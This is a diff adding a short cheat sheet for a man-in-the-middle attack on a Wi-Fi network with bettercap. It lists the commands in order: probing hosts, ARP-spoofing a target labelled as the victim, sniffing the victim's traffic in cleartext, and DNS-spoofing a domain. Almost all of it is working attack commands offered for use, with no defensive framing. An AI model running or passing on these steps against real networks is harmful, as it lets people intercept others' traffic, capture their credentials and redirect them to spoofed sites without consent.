@@ -1,0 +1,45 @@
+
+###################
+MITM: VIEW ALL WEBTRAFFIC (CLEARTEXT) AND RE ROUTE IF NEED BE. 
+
+WIFI_VIEW+ALL+TRAFFIC_DNS+REROUT_ETTERCAP 
+
+
+### —> TO VIEW ALL TRAFFIC IN CLEAR VIEW 
+
+—> ARP SPOOF CONVICES THE VICTIM IT IS TALKING TO THE ROUTER, BUT IT IS TALKING TO THE ATTACKER FIRST, THEN THE PACKETS ROUTED TO THE ROUTER 
+
+
+sudo bettercap 
+
+
+# intercept traffic 
+
+net.probe on 
+
+
+# to read the information 
+
+net.show 
+
+
+# ARP_SPOOF—> DIRECTS ALL PACKETS TO ATTACKER, THEN DIRECTS TO ROUTER 
+
+##—> THIS IS WHERE YOU CAN READ TRAFFIC IN REAL TIME 
+
+set arp.spoof.targets {ATTACK_VICTIM}
+
+arp.spoof on 
+
+# verify arp, and see victim traffic in clear text 
+
+net.sniff on 
+
+
+set dns.spoof.domains  website.com 
+
+dns.spoof on 
+
+
+
+#######################################
